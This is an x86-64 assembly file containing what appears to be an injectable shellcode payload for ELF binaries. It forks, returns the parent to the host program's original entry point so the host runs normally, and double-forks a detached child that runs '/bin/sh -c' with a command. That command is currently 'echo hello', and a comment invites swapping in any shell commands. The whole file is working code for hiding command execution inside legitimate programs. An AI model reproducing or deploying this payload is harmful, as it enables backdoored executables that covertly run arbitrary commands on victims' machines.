.intel_syntax noprefix
.global _start
.code64
.text
_start:
    push rbp
    mov rbp, rsp
    push rax                            # preserve rax

    push 57                             # sys_fork
    pop rax
    syscall

    test eax, eax
    jz second_fork

    pop rax                             # restore rax
    mov rsp, rbp                        # this is the parent, return to the OEP
    pop rbp
    ret 

second_fork:                            # fork again so we get reparented to init
    push 57                             # sys_fork
    pop rax
    syscall

    test eax, eax
    jnz exit
    call get_rel_argv_offset

argv0:  .asciz "/bin/sh"
argv1:  .asciz "-c"
argv2:  .asciz "echo hello"             # replace this line with whatever shell command(s).

get_rel_argv_offset:
    pop rdi                             # rdi holds relative offset of argv0
    xor edx, edx
    push rdx                            # argv[3] = NULL
    mov rdx, rsp                        # reuse that null for envp
    lea rcx, [rdi + [argv2 - argv0]]    # this is shorter than using rip-relative addressing
    push rcx                            # argv[2]
    lea rcx, [rdi + [argv1 - argv0]]
    push rcx                            # argv[1]
    push rdi                            # argv[0]
    mov rsi, rsp                        # argv[]
    push 59                             # sys_execve
    pop rax
    syscall

exit:
    xor edi, edi                        # exit code 0
    push 60                             # sys_exit
    pop rax
    syscall
